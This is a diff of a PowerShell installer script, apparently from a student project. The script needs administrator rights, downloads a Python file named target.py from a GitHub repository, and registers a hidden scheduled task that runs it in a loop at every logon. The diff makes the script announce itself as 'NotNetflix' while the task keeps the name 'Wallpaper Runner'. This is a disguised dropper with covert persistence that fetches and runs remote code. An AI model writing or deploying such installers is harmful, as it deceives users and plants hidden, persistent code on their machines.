@@ -4,23 +4,26 @@ If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     exit
 }
 
-Write-Output "[*] Installing Wallpaper Runner..."
+Write-Output "[*] Installing NotNetflix..."
 
-# Config
+# Configuration
 $installPath = "$env:ProgramData\WallpaperRunner"
 $scriptUrl = "https://raw.githubusercontent.com/lisenapati/pbl202.24/main/target/target.py"
-$pythonPath = (Get-Command python).Source
+$pythonPath = (Get-Command python3 -ErrorAction SilentlyContinue)?.Source
+if (-not $pythonPath) { $pythonPath = (Get-Command python -ErrorAction Stop).Source }
 
-# Create folder
+# Create installation folder
 New-Item -Path $installPath -ItemType Directory -Force | Out-Null
 
-# Download target.py
+# Download the latest target.py
 Invoke-WebRequest -Uri $scriptUrl -OutFile "$installPath\target.py"
 
-# Register Scheduled Task
-$action = New-ScheduledTaskAction -Execute $pythonPath -Argument "$installPath\target.py"
+# Prepare scheduled task
+$action = New-ScheduledTaskAction -Execute $pythonPath -Argument "`"$installPath\target.py`" --loop"
 $trigger = New-ScheduledTaskTrigger -AtLogOn
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable
+
+# Register task under SYSTEM with hidden execution
 Register-ScheduledTask -TaskName "Wallpaper Runner" -Action $action -Trigger $trigger -Settings $settings -Force
 
-Write-Output "[+] Installed Wallpaper Runner as a scheduled task."
+Write-Output "[+] NotNetflix has been installed."
